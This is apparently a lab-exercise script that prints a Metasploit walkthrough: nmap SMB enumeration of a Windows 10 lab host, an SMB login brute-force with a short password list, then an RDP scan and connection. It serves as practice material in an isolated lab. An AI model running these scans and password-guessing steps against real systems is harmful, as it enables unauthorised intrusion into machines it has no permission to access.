echo '
--] METASPLOIT FRAMEWORK 28

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134
OSCAR      === WIN 10             IP === 133

OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> cd /usr/share/nmap/scripts/
OPERATOR    ==> TASK ==> ls |grep smb
OPERATOR    ==> TASK ==> nmap --script=smb-system-info.nse IP_OSCAR
OPERATOR    ==> TASK ==> nmap --script=smb-os-discovery.nse IP_OSCAR



OPERATOR    ==> TASK ==> use auxiliary/scanner/smb/smb_login
OPERATOR    ==> TASK ==> show options
OPERATOR    ==> TASK ==> set rhosts IP_OSCAR
OPERATOR    ==> TASK ==> set threads 3
OPERATOR    ==> TASK ==> cd /root/
OPERATOR    ==> TASK ==> echo {1..5} > Pass.lst
OPERATOR    ==> TASK ==> echo -e "dffsafasdfadsf\nfasdfdsf0000\nsfdafsdf0\nAa123456\n" > Pass.lst << use vim or nano is better bro 
OPERATOR    ==> TASK ==> set PASS_FILE /home/Desktop/Pass.lst
OPERATOR    ==> TASK ==> set smbuser PTBOX
OPERATOR    ==> TASK ==> show options
OPERATOR    ==> TASK ==> nmap -p 3389 -sV IP_OSCAR
OPERATOR    ==> TASK ==> rdesktop IP_OSCAR



'
read